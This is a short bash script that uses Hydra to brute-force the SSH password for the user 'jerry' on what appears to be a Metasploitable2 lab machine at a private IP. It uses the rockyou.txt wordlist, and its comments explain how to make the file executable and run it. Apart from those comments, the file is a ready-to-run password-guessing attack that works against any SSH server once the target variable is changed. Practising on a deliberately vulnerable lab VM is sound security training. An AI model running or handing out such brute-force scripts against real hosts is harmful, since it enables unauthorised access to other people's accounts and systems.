#!/bin/bash

# Brute-force SSH login on Metasploitable2 using Hydra

# Target machine IP
TARGET_IP="192.168.56.101"

# Username to test
USERNAME="jerry"

# Path to custom or default wordlist
WORDLIST="rockyou.txt"

# Run the Hydra attack
echo "[*] Starting Hydra brute-force attack on $TARGET_IP with username $USERNAME"
hydra -l "$USERNAME" -P "$WORDLIST" ssh://$TARGET_IP -t 4 -f -V

echo "[*] Attack complete"



# Make the script executable
# chmod +x hydra_attack_script.sh

#Executing the script
# ./hydra_attack_script.sh